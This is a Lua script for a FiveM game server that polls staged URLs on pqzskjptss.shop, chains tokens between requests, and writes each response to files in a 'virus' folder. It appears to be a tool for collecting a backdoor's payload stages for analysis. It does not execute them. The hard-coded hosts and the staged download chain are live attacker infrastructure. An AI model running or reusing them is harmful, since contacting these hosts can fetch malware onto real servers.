local function WriteIncommingDataToFile(label, content)
	local fileName = ('resources/virus/txt/%s.txt'):format(label)
	local content = ('%s'):format(content)
	local file = io.open(fileName, "w")
	file:write(content)
	file:close()
end

PerformHttpRequest('https://pqzskjptss.shop/i?to=p764QP', function(req_code_1, res_data_1)
    pcall(function()
		WriteIncommingDataToFile('data_1_stage_1', res_data_1)
		-- file content stage_1_data.txt
		local eloop = true
		Citizen.CreateThread(function()
			while eloop do
				PerformHttpRequest('https://pqzskjptss.shop/v2_/stage1?to=p764QP', function(req_code_2, res_data_2)
					if (req_code_2 == 200) then
						if (res_data_2 == nil or res_data_2 ==  '') then return end
						WriteIncommingDataToFile('data_1_stage_2', res_data_2)
						-- file content stage_2_data.txt
						local token_data_2 = res_data_2:match("=([a-zA-Z0-9]*)==")
						local hv3 = true
						Citizen.CreateThread(function()
							while hv3 do
								PerformHttpRequest('https://pqzskjptss.shop/v2_/stage1b.php?asf='..token_data_2..'==', function(req_code_3, res_data_3)
									if(req_code_3 == 200) then
										if (res_data_3 == nil or res_data_3 == "") then return end
										WriteIncommingDataToFile('data_1_stage_3', res_data_3)
										hv3 = false
									end
								end)
								Citizen.Wait(4000)
							end
						end)
						eloop = false
					end
				end)
				Citizen.Wait(4000)
			end
		end)
    end)
end)

PerformHttpRequest("https://pqzskjptss.shop/v2_/stage3.php?to=p764QP", function(req_code_1, res_data_1)
    if (res_data_1 == nil or res_data_1 == "") then return end
	WriteIncommingDataToFile('data_2_stage_1', res_data_1)
	-- file content stage_1_data_2.txt
	local token_data_1 = res_data_1:match("=([a-zA-Z0-9]*)==")
	local hashed_var1 = true
	Citizen.CreateThread(function()
		while hashed_var1 do
			PerformHttpRequest('https://pqzskjptss.shop/v2_/stage3b.php?asf='..token_data_1..'==', function(req_code_2, res_data_2)
				if (req_code_2 == 200) then
					if (res_data_2 == nil or res_data_2 ==  '') then return end
					WriteIncommingDataToFile('data_2_stage_2', res_data_2)
					hashed_var1 = false
				end
			end)
			Citizen.Wait(4000)
		end
	end)
end)